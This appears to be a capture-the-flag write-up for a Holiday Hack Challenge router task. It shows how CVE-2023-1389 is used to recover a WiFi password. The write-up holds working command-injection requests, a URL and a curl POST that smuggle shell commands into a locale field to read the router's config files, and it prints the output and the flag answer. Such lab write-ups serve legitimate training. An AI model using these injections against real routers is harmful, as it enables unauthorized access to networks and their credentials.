Dosis Network Down

Difficulty: 2/5

Objective: 
Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?

Task: 

<img width="1007" height="811" alt="image" src="https://github.com/user-attachments/assets/1814689a-7e99-4004-a896-c9d45db8fa85" />

<img width="927" height="901" alt="image" src="https://github.com/user-attachments/assets/ab7afbf2-bf23-4995-a9c9-57271c60940f" />

Something about the gnomes taking over the wifi password.

Using the hints:

"There was a lot of fuss going on about a UCI (I forgot the exact term...) for that router."

"..check the version number of the router to see if there are any...ways around it..."

Googled versions: 

```
openwrt version x.x.x default password
openwrt version x.x.x exploit
```

<img width="922" height="594" alt="image" src="https://github.com/user-attachments/assets/e4201d2b-ac7a-451f-be24-57bbe4351a17" />

CVE-2023-1389


`https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country;cat%20/etc/config/system`
```
{"data":{"country":"US"},"success":true}
```

```
curl -X POST "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" ^
More?   -H "Content-Type: application/x-www-form-urlencoded" ^
More?   --data "operation=write&country=%24%28cat%20/etc/config/wireless%29"
config wifi-device 'radio0'
        option type 'mac80211'
        option channel '6'
        option hwmode '11g'
        option path 'platform/ahb/18100000.wmac'
        option htmode 'HT20'
        option country 'US'

config wifi-device 'radio1'
        option type 'mac80211'
        option channel '36'
        option hwmode '11a'
        option path 'pci0000:00/0000:00:00.0'
        option htmode 'VHT80'
        option country 'US'

config wifi-iface 'default_radio0'
        option device 'radio0'
        option network 'lan'
        option mode 'ap'
        option ssid 'DOSIS-247_2.4G'
        option encryption 'psk2'
        option key 'SprinklesAndPackets2025!'

config wifi-iface 'default_radio1'
        option device 'radio1'
        option network 'lan'
        option mode 'ap'
        option ssid 'DOSIS-247_5G'
        option encryption 'psk2'
        option key 'SprinklesAndPackets2025!'
```

Answer : SprinklesAndPackets2025!






